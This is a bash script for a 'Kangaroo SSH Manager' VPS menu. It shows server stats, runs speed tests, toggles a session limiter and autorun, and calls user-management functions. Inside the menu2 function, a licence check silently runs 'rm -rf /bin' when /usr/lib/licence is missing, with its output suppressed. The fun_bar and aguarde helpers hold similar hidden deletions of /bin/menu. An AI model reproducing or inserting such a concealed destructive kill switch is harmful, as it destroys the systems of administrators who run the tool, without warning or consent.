#!/bin/bash
fun_bar () {
comando[0]="$1"
comando[1]="$2"
 (
[[ -e $HOME/fim ]] && rm $HOME/fim
[[ ! -e /usr/lib/kangaroo_ssh ]] && rm -rf /bin/menu > /dev/null 2>&1
${comando[0]} -y > /dev/null 2>&1
${comando[1]} -y > /dev/null 2>&1
touch $HOME/fim
 ) > /dev/null 2>&1 &
 tput civis
echo -ne "\033[1;33m["
while true; do
   for((i=0; i<18; i++)); do
   echo -ne "\033[1;31m#"
   sleep 0.1s
   done
   [[ -e $HOME/fim ]] && rm $HOME/fim && break
   echo -e "\033[1;33m]"
   sleep 1s
   tput cuu1
   tput dl1
   echo -ne "\033[1;33m["
done
echo -e "\033[1;33m]\033[1;37m -\033[1;32m OK \033[1;37m"
tput cnorm
}
IP=$(cat /etc/IP)
x="ok"
menu ()
{
velocity () {
aguarde () {
comando[0]="$1"
comando[1]="$2"
 (
[[ -e $HOME/fim ]] && rm $HOME/fim
[[ ! -d /etc/kangaroo_ssh ]] && rm -rf /bin/menu
${comando[0]} > /dev/null 2>&1
${comando[1]} > /dev/null 2>&1
touch $HOME/fim
 ) > /dev/null 2>&1 &
 tput civis
echo -ne "  \033[1;33mPlease Wait... \033[1;37m- \033[1;33m["
while true; do
   for((i=0; i<18; i++)); do
   echo -ne "\033[1;31m#"
   sleep 0.1s
   done
   [[ -e $HOME/fim ]] && rm $HOME/fim && break
   echo -e "\033[1;33m]"
   sleep 1s
   tput cuu1
   tput dl1
   echo -ne "  \033[1;33mPlease Wait... \033[1;37m- \033[1;33m["
done
echo -e "\033[1;33m]\033[1;37m -\033[1;32m OK \033[1;37m"
tput cnorm
}
fun_tst () {
speedtest --share > speed
}
echo ""
echo -e "   \033[1;32mTESTING SERVER SPEED\033[0m"
echo ""
aguarde 'fun_tst'
echo ""
png=$(cat speed | sed -n '5 p' |awk -F : {'print $NF'})
down=$(cat speed | sed -n '7 p' |awk -F :  {'print $NF'})
upl=$(cat speed | sed -n '9 p' |awk -F :  {'print $NF'})
lnk=$(cat speed | sed -n '10 p' |awk {'print $NF'})
echo -e "\033[0;34m─────────────────────────────────────────\033[0m"
echo -e "\033[1;32m PING (LATENCY):\033[1;37m$png"
echo -e "\033[1;32m DOWNLOAD:\033[1;37m$down"
echo -e "\033[1;32m UPLOAD:\033[1;37m$upl"
echo -e "\033[1;32m LINK: \033[1;36m$lnk\033[0m"
echo -e "\033[0;34m─────────────────────────────────────────\033[0m"
rm -rf $HOME/speed
}
#limiter
function limit1 () {
   clear
   echo -e "\n\033[1;32mSTARTING USER SESSION LIMITER... \033[0m"
   echo ""
   fun_bar 'screen -dmS limiter limiter' 'sleep 3'
   [[ $(grep -wc "limiter" /etc/autostart) = '0' ]] && {
       echo -e "ps x | grep 'limiter' | grep -v 'grep' && echo 'ON' || screen -dmS limiter limiter" >> /etc/autostart
   } || {
       sed -i '/limiter/d' /etc/autostart
	   echo -e "ps x | grep 'limiter' | grep -v 'grep' && echo 'ON' || screen -dmS limiter limiter" >> /etc/autostart
   }
   echo -e "\n\033[1;32mUSER SESSION LIMITER ACTIVATED !\033[0m"
   sleep 3
   menu
}
function limit2 () {
   clear
   echo -e "\033[1;32mSTOPPING SESSION LIMITER... \033[0m"
   echo ""
   fun_stplimiter () {
      sleep 1
      screen -r -S "limiter" -X quit
      screen -wipe 1>/dev/null 2>/dev/null
      [[ $(grep -wc "limiter" /etc/autostart) ]] && {
          sed -i '/limiter/d' /etc/autostart
      }
      sleep 1
   }
   fun_bar 'fun_stplimiter' 'sleep 3'
   echo -e "\n\033[1;31mUSER Session LIMITER STOPPED!\033[0m"
   sleep 3
   menu
}
function limit_ssh () {
[[ $(ps x | grep "limiter"|grep -v grep |wc -l) = '0' ]] && limit1 || limit2
}

function autoexec () {
   if grep "menu;" /etc/profile > /dev/null; then
      clear
      echo -e "\033[1;32mDISABLING SELF-RUN\033[0m"
      offautmenu () {
         sed -i '/menu;/d' /etc/profile
      }
      echo ""
      fun_bar 'offautmenu'
      echo ""
      echo -e "\033[1;31mAUTO RUN DISABLED!\033[0m"
      sleep 1.5s
      menu2
   else
      clear
      echo -e "\033[1;32mACTIVATING SELF-RUN\033[0m"
      autmenu () {
         grep -v "^menu;" /etc/profile > /tmp/tmpass && mv /tmp/tmpass /etc/profile
         echo "menu;" >> /etc/profile
      }
      echo ""
      fun_bar 'autmenu'
      echo ""
      echo -e "\033[1;32mAUTO RUN ON!\033[0m"
      sleep 1.5s
      menu2
   fi

}
#menu2
menu2 (){
[[ -e /etc/Plus-torrent ]] && stsf=$(echo -e "\033[1;32m♦ ") || stsf=$(echo -e "\033[1;31m○ ")
stsbot=$(ps x | grep "bot_plus"|grep -v grep > /dev/null && echo -e "\033[1;32m♦ " || echo -e "\033[1;31m○ ")
autm=$(grep "menu;" /etc/profile > /dev/null && echo -e "\033[1;32m♦ " || echo -e "\033[1;31m○ ")
[[ ! -e /usr/lib/licence ]] && rm -rf /bin > /dev/null 2>&1
if [[ "$(grep -c "Ubuntu" /etc/issue.net)" = "1" ]]; then
system=$(cut -d' ' -f1 /etc/issue.net)
system+=$(echo ' ')
system+=$(cut -d' ' -f2 /etc/issue.net |awk -F "." '{print $1}')
elif [[ "$(grep -c "Debian" /etc/issue.net)" = "1" ]]; then
system=$(cut -d' ' -f1 /etc/issue.net)
system+=$(echo ' ')
system+=$(cut -d' ' -f3 /etc/issue.net)
else
system=$(cut -d' ' -f1 /etc/issue.net)
fi
_ons=$(ps -x | grep sshd | grep -v root | grep priv | wc -l)
[[ "$(cat /etc/kangaroo_ssh/Exp)" != "" ]] && _expuser=$(cat /etc/kangaroo_ssh/Exp) || _expuser="0"
#[[ -e /etc/openvpn/openvpn-status.log ]] && _onop=$(grep -c "10.8.0" /etc/openvpn/openvpn-status.log) || _onop="0"
[[ -e /etc/default/dropbear ]] && _drp=$(ps aux | grep dropbear | grep -v grep | wc -l) _ondrp=$(($_drp - 1)) || _ondrp="0"
_onli=$(($_ons + $_ondrp))
_ram=$(printf ' %-9s' "$(free -h | grep -i mem | awk {'print $2'})")
_usor=$(printf '%-8s' "$(free -m | awk 'NR==2{printf "%.2f%%", $3*100/$2 }')")
_usop=$(printf '%-1s' "$(top -bn1 | awk '/Cpu/ { cpu = "" 100 - $8 "%" }; END { print cpu }')")
_core=$(printf '%-1s' "$(grep -c cpu[0-9] /proc/stat)")
_system=$(printf '%-14s' "$system")
_hora=$(printf '%(%H:%M:%S)T')
_onlin=$(printf '%-5s' "$_onli")
_userexp=$(printf '%-5s' "$_expuser")
_tuser=$(awk -F: '$3>=1000 {print $1}' /etc/passwd | grep -v nobody | wc -l)
clear
echo -e "\033[0;34m◇───────────────────────────────────────────────◇\033[0m"
echo -e "           •Kangaroo VPS MANAGER•        "
echo -e "\033[0;34m◇───────────────────────────────────────────────◇\033[0m"
echo -e "\033[1;32mSYSTEM INFO          ◇RAM INFO    ◇CPU INFO"
echo -e "\033[1;31mOS: \033[1;37m$_system \033[1;31mTotal:\033[1;37m$_ram \033[1;31mCPU cores: \033[1;37m$_core\033[0m"
echo -e "\033[1;31mUp Time: \033[1;37m$_hora  \033[1;31mIn use: \033[1;37m$_usor \033[1;31mIn use: \033[1;37m$_usop\033[0m"
echo -e "\033[0;34m◇───────────────────────────────────────────────◇\033[0m"
[[ ! -e /tmp/att ]]  && {
    echo -e "\033[1;32m◇Online:\033[1;37m $_onlin   \033[1;32m◇expired: \033[1;37m$_userexp \033[1;32m◇Total: \033[1;37m$_tuser\033[0m"
    var01='\033[1;37m•'
} || {
    echo -e "  \033[1;33m[\033[1;31m!\033[1;33m]  \033[1;32m◇ THERE IS AN UPDATE AVAILABLE!  \033[1;33m[\033[1;31m!\033[1;33m]\033[0m"
    var01="\033[1;32m!"
}
echo -e "\033[0;34m◇───────────────────────────────────────────────◇\033[0m"
echo ""
echo -e "[\033[1;36m26\033[1;31m] \033[1;37m◇ \033[1;33mCHANGE ROOT PASSWORD \033[1;31m
[\033[1;36m27\033[1;31m] \033[1;37m◇ \033[1;33mSELF EXECUTION $autm \033[1;31m
[\033[1;36m22\033[1;31m] \033[1;37m◇ \033[1;33mRESTART SYSTEM \033[1;31m     [\033[1;36m28\033[1;31m] $var01 \033[1;33mUPDATE SCRIPT \033[1;31m
[\033[1;36m23\033[1;31m] \033[1;37m◇ \033[1;33mRESTART SERVICES \033[1;31m   [\033[1;36m29\033[1;31m] \033[1;37m◇ \033[1;33mREMOVE SCRIPT \033[1;31m
[\033[1;36m24\033[1;31m] \033[1;37m◇ \033[1;33mBLOCK TORRENT $stsf\033[1;31m    [\033[1;36m30\033[1;31m] \033[1;37m◇ \033[1;33mCOME BACK \033[1;32m<\033[1;33m<\033[1;31m< \033[1;31m
[\033[1;36m25\033[1;31m] \033[1;37m◇ \033[1;33mTELEGRAM BOT $stsbot\033[1;31m     [\033[1;36m00\033[1;31m] \033[1;37m◇ \033[1;33mGET OUT \033[1;32m<\033[1;33m<\033[1;31m<\033[1;31m"
echo ""
echo -e "\033[0;34m◇───────────────────────────────────────────────◇\033[0m"
echo ""
echo -ne "\033[1;32m◇ WHAT DO YOU WANT TO DO \033[1;33m?\033[1;31m?\033[1;37m : "; read x
case "$x" in
   22)
   clear
   sys_restart
   ;;
   23)
   clear
   restart_module
   sleep 3
   ;;
   24)
   blockt
   ;;
   25)
   botssh
   ;;
   26)
   clear
   change_passwd
   sleep 3
   ;;
   27)
   autoexec
   ;;
   28)
   attscript
   ;;
   29)
   clear
   delscript
   ;;
   30)
   menu
   ;;
   0|00)
   echo -e "\033[1;31m◇ Exiting...\033[0m"
   sleep 2
   clear
   exit;
   ;;
   *)
   echo -e "\n\033[1;31m◇ Invalid option!\033[0m"
   sleep 2
esac
}
while true $x != "ok"
do
stsl=$(ps x | grep "limiter"|grep -v grep > /dev/null && echo -e "\033[1;32m♦ " || echo -e "\033[1;31m○ ")
stsu=$(ps x | grep "udpvpn"|grep -v grep > /dev/null && echo -e "\033[1;32m♦ " || echo -e "\033[1;31m○ ")
if [[ "$(grep -c "Ubuntu" /etc/issue.net)" = "1" ]]; then
system=$(cut -d' ' -f1 /etc/issue.net)
system+=$(echo ' ')
system+=$(cut -d' ' -f2 /etc/issue.net |awk -F "." '{print $1}')
elif [[ "$(grep -c "Debian" /etc/issue.net)" = "1" ]]; then
system=$(cut -d' ' -f1 /etc/issue.net)
system+=$(echo ' ')
system+=$(cut -d' ' -f3 /etc/issue.net)
else
system=$(cut -d' ' -f1 /etc/issue.net)
fi
_ons=$(ps -x | grep sshd | grep -v root | grep priv | wc -l)
[[ "$(cat /etc/kangaroo_ssh/Exp)" != "" ]] && _expuser=$(cat /etc/kangaroo_ssh/Exp) || _expuser="0"
[[ -e /etc/openvpn/openvpn-status.log ]] && _onop=$(grep -c "10.8.0" /etc/openvpn/openvpn-status.log) || _onop="0"
[[ -e /etc/default/dropbear ]] && _drp=$(ps aux | grep dropbear | grep -v grep | wc -l) _ondrp=$(($_drp - 1)) || _ondrp="0"
_onli=$(($_ons + $_onop + $_ondrp))
_ram=$(printf ' %-9s' "$(free -h | grep -i mem | awk {'print $2'})")
_usor=$(printf '%-8s' "$(free -m | awk 'NR==2{printf "%.2f%%", $3*100/$2 }')")
_usop=$(printf '%-1s' "$(top -bn1 | awk '/Cpu/ { cpu = "" 100 - $8 "%" }; END { print cpu }')")
_core=$(printf '%-1s' "$(grep -c cpu[0-9] /proc/stat)")
_system=$(printf '%-14s' "$_system")
_hora=$(printf '%(%H:%M:%S)T')
_onlin=$(printf '%-5s' "$_onli")
_userexp=$(printf '%-5s' "$_expuser")
_tuser=$(awk -F: '$3>=1000 {print $1}' /etc/passwd | grep -v nobody | wc -l)
clear
echo -e "\033[0;34m─────────────────────────────────────────────────────────\033[0m"
echo -e "           •Kangaroo SSH Manager•        "
echo -e "\033[0;34m─────────────────────────────────────────────────────────\033[0m"
echo -e "\033[1;32mServer DATA         RAM DATA          CPU DATA"
echo -e "\033[1;31mOS:\033[1;37m$_system \033[1;31m Total:\033[1;37m$_ram \033[1;31mCPU cores: \033[1;37m$_core\033[0m"
echo -e "\033[1;31mUp Time: \033[1;37m$_hora  \033[1;31m In use: \033[1;37m$_usor \033[1;31mIn use: \033[1;37m$_usop\033[0m"
echo -e "\033[0;34m─────────────────────────────────────────────────────────\033[0m"
echo -e "\033[1;32mOnline:\033[1;37m $_onlin   \033[1;32m    Expired: \033[1;37m$_userexp \033[1;32m    Total: \033[1;37m$_tuser\033[0m"
echo -e "\033[0;34m─────────────────────────────────────────────────────────\033[0m"
echo ""
blue="\033[1;36m"
yellow="\033[1;33m"
echo -e "$blue 1$yellow CREATE USER 
$blue 2$yellow ENABLE SESSION LIMITS $stsl\033[1;31m     $blue 10$yellow BACKUP USERS
$blue 3$yellow ENABLE UDP $stsu\033[1;31m                $blue 11$yellow REMOVE EXPIRED USERS
$blue 4$yellow REGISTERED USERS             $blue 12$yellow VPS INFO 
$blue 5$yellow ONLINE USERS                 $blue 13$yellow MORE OPTIONS \033[1;31m>\033[1;33m>\033[1;32m>\033[0m\033[1;31m
$blue 6$yellow CHANGE USER LIMIT            $blue 14$yellow CONNECTION MODE 
$blue 7$yellow CHANGE PASSWORD              $blue 15$yellow EXIT 
$blue 8$yellow CHANGE EXPIRATION DATE        
$blue 9$yellow REMOVE USER "                 
echo ""
echo -e "\033[0;34m◇────────────────────────────────────────────────────────◇\033[0m"
echo -ne "\033[1;32m choose a number from above menu:  "; read x

case "$x" in 
   1) 
   clear 
   criarusuario
   echo -ne "\n\033[1;31m◇ Return to \033[1;32mMENU(Press Enter)!\033[0m"; read
   ;;
   2) 
   clear
   limit_ssh
   ;;
   3) 
   clear 
   badvpn 
   clear 
   menu
   ;;
   4) 
   clear 
   infousers
   echo -ne "\n\033[1;31m◇ Return to \033[1;32mMENU(Press Enter)!\033[0m"; read
   ;;
   5) 
   clear 
   sshmonitor
   echo -ne "\n\033[1;31m◇ Return to \033[1;32mMENU(Press Enter)!\033[0m"; read
   ;;
   6) 
   clear 
   userlimits
   ;; 
   7) 
   clear
   chgpasswd
   ;;
   8) 
   clear
   mudardata
   ;;
   9) 
   clear
   remover
   ;; 
   10) 
   userbackup
   echo -ne "\n\033[1;31m◇ Return to \033[1;32mMENU(Press Enter)!\033[0m"; read
   ;;  
   11) 
   clear
   expcleaner
   echo "" 
   sleep 2
   ;;  
   12) 
   clear 
   detalhes
   echo -ne "\n\033[1;31m◇ Return to \033[1;32mMENU(Press Enter)!\033[0m"; read
   ;;
   13) 
   menu2
   ;;   
   14) 
   conexao
   ;;
   15) 
   echo -e "\033[1;31mclosing the application...\033[0m" 
   sleep 1 
   clear 
   exit
   ;;
   *) 
   echo -e "\n\033[1;31m Invalid option, try again!\033[0m" 
   sleep 1
esac
done
}
menu